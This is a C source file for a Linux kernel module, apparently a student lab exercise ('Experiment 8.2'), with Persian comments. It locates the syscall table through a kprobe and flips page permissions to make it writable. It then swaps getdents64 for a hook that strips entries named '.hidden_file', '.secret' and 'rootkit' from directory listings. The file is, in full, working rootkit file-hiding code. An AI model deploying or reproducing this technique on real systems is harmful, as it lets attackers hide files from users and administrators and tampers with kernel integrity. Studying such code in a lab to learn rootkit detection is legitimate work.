#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <asm/ptrace.h>
#include <asm/set_memory.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Hook getdents64 - Experiment 8.2 - Kernel 6.1.159");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;

typedef long (*syscall_fn_t)(const struct pt_regs *);

static unsigned long *sct_addr = NULL;
static syscall_fn_t original_getdents64 = NULL;

static const char *hidden_files[] = {
    ".hidden_file",
    ".secret",
    "rootkit",
    NULL
};

static int should_hide(const char *name)
{
    int i;
    if (!name)
        return 0;
    for (i = 0; hidden_files[i] != NULL; i++) {
        if (strcmp(name, hidden_files[i]) == 0)
            return 1;
    }
    return 0;
}

static long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent;
    long ret;
    char *buf = NULL;
    long offset;
    struct linux_dirent64 *d;
    long remaining;

    dirent = (struct linux_dirent64 __user *)regs->si;

    ret = original_getdents64(regs);
    if (ret <= 0)
        return ret;

    buf = kzalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    if (copy_from_user(buf, dirent, ret)) {
        kfree(buf);
        return ret;
    }

    offset = 0;
    while (offset < ret) {
        d = (struct linux_dirent64 *)(buf + offset);

        if (d->d_reclen == 0)
            break;

        if (should_hide(d->d_name)) {
            printk(KERN_INFO "[EXP8.2] Hiding: %s\n", d->d_name);
            remaining = ret - offset - d->d_reclen;
            if (remaining > 0)
                memmove(buf + offset, buf + offset + d->d_reclen, remaining);
            ret -= d->d_reclen;
            continue;
        }
        offset += d->d_reclen;
    }

    copy_to_user(dirent, buf, ret);
    kfree(buf);
    return ret;
}

static int find_kallsyms_lookup_name(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "[-] register_kprobe failed: %d\n", ret);
        return ret;
    }

    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

/* تغییر permission صفحه حافظه syscall table */
static int make_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (!pte)
        return -1;
    pte->pte |= _PAGE_RW;
    return 0;
}

static int make_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (!pte)
        return -1;
    pte->pte &= ~_PAGE_RW;
    return 0;
}

static int __init hook_init(void)
{
    int ret;

    printk(KERN_INFO "[+] Experiment 8.2: Loading...\n");

    ret = find_kallsyms_lookup_name();
    if (ret < 0)
        return ret;

    sct_addr = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
    if (!sct_addr) {
        printk(KERN_ERR "[-] sys_call_table not found\n");
        return -EFAULT;
    }
    printk(KERN_INFO "[+] sys_call_table at: 0x%lx\n",
           (unsigned long)sct_addr);

    original_getdents64 = (syscall_fn_t)sct_addr[217];
    printk(KERN_INFO "[+] Original getdents64: 0x%lx\n",
           (unsigned long)original_getdents64);

    /* تغییر permission صفحه به RW */
    ret = make_rw((unsigned long)&sct_addr[217]);
    if (ret) {
        printk(KERN_ERR "[-] make_rw failed\n");
        return -EFAULT;
    }
    printk(KERN_INFO "[+] Page set to RW\n");

    /* جایگزینی syscall */
    sct_addr[217] = (unsigned long)hooked_getdents64;

    /* بازگرداندن permission به RO */
    make_ro((unsigned long)&sct_addr[217]);
    printk(KERN_INFO "[+] Page set back to RO\n");

    printk(KERN_INFO "[+] getdents64 hooked successfully!\n");
    printk(KERN_INFO "[+] Hidden: .hidden_file, .secret, rootkit\n");

    return 0;
}

static void __exit hook_exit(void)
{
    int ret;

    if (sct_addr && original_getdents64) {
        ret = make_rw((unsigned long)&sct_addr[217]);
        if (ret) {
            printk(KERN_ERR "[-] make_rw failed on exit\n");
            return;
        }

        sct_addr[217] = (unsigned long)original_getdents64;
        make_ro((unsigned long)&sct_addr[217]);

        printk(KERN_INFO "[+] getdents64 restored\n");
    }
    printk(KERN_INFO "[-] Experiment 8.2: Unloaded\n");
}

module_init(hook_init);
module_exit(hook_exit);
